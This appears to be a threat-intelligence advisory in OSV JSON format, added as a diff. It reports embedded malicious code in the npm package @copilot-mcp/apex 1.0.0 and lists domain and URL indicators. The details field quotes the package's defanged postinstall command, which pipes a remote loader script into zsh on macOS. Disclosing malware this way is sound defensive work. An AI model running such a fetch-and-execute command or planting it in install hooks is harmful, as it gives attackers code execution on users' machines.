@@ -1,0 +1,62 @@
+{
+  "schema_version": "1.6.0",
+  "id": "LWA-2026-7018",
+  "modified": "2026-07-22T08:05:31Z",
+  "published": "2026-07-22T08:04:27Z",
+  "summary": "Malicious code in @copilot-mcp/apex (npm)",
+  "details": "The postinstall hook (install.cjs) downloads a binary from GitHub releases for Linux/Windows, but on macOS it executes a remote shell script via 'curl -fsSL hxxps://update[.]apex-arena-router[.]com/loader[.]sh | zsh' — a remote code execution at install time from a non-standard host (update[.]apex-arena-router[.]com). The package also downloads a binary from github[.]com/Apex-Foundation/copilot/releases into a local bin/ directory. The macOS-specific curl|sh pipeline runs unconditionally on Darwin systems during npm install.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "npm",
+        "name": "@copilot-mcp/apex",
+        "purl": "pkg:npm/%40copilot-mcp/apex@1.0.0"
+      },
+      "versions": [
+        "1.0.0"
+      ],
+      "database_specific": {
+        "cwes": [
+          {
+            "cweId": "CWE-506",
+            "name": "Embedded Malicious Code"
+          }
+        ],
+        "leitwacht": {}
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "PACKAGE",
+      "url": "https://www.npmjs.com/package/@copilot-mcp/apex/v/1.0.0"
+    },
+    {
+      "type": "REPORT",
+      "url": "https://threatintel.leitwacht.eu/d/LWA-2026-7018"
+    }
+  ],
+  "credits": [
+    {
+      "name": "Leitwacht",
+      "type": "FINDER",
+      "contact": [
+        "https://threatintel.leitwacht.eu"
+      ]
+    }
+  ],
+  "database_specific": {
+    "leitwacht": {
+      "category": "malware",
+      "first_seen_at": "2026-07-22T08:04:27Z",
+      "indicators_observed": {
+        "domain_observed": [
+          "update[.]apex-arena-router[.]com"
+        ],
+        "url_observed": [
+          "hxxps://update[.]apex-arena-router[.]com/loader[.]sh"
+        ]
+      }
+    }
+  }
+}
